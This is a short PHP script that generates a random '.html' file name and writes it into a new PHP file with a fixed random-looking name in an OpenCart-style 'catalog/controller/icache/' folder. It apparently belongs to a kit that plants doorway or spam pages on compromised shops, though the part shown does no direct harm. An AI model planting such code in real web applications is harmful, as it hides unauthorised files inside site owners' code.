<?php 
 function RandomString($length) {
    $key = '';
    $keys = array_merge(range(0,9), range('a', 'z'));

    for($i=0; $i < $length; $i++) {

        $key .= $keys[array_rand($keys)];

    }

    return $key;

}

$uberfilenames = RandomString(14);
$uberfs ="catalog/controller/icache/";
$uberws = ".html";
$uberqs = $uberfilenames.$uberws;
$uberss = $uberfs.$uberqs;
$var_str = var_export($uberqs, true);
$uberprqs = "<?php\n\n\$uberprqs2 = $var_str;\n\n?>";
file_put_contents('catalog/controller/icache/FbIRQhz7mS2.php', $uberprqs);
?>